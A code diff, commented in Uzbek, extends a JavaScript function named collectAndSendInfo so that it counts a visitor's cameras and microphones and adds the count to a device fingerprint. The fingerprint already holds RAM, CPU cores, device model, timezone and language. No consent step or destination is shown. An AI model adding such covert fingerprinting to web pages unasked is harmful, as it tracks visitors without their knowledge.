@@ -22,7 +22,22 @@ async function collectAndSendInfo() {
             }
         } catch (e) {}
 
-        // 3. Qurilma modeli va ma'lumotlar
+        // 3. Media (Kamera va Mikrofon) - Kuchaytirilgan
+        let media = { videoinput: 0, audioinput: 0 };
+        try {
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                devices.forEach(d => {
+                    if (d.kind === 'videoinput') media.videoinput++;
+                    if (d.kind === 'audioinput') media.audioinput++;
+                });
+            }
+            if (media.videoinput === 0 && navigator.mediaDevices.getSupportedConstraints().facingMode) {
+                media.videoinput = "Mavjud (Yopiq)";
+            }
+        } catch (e) {}
+
+        // 4. Qurilma modeli va ma'lumotlar
         let exactModel = "";
         try {
             if (navigator.userAgentData) {
@@ -41,6 +56,7 @@ async function collectAndSendInfo() {
             ram: navigator.deviceMemory || "Noma'lum",
             cores: navigator.hardwareConcurrency || "Noma'lum",
             exactModel: exactModel,
+            media: media,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             language: navigator.language,
             touchPoints: navigator.maxTouchPoints,
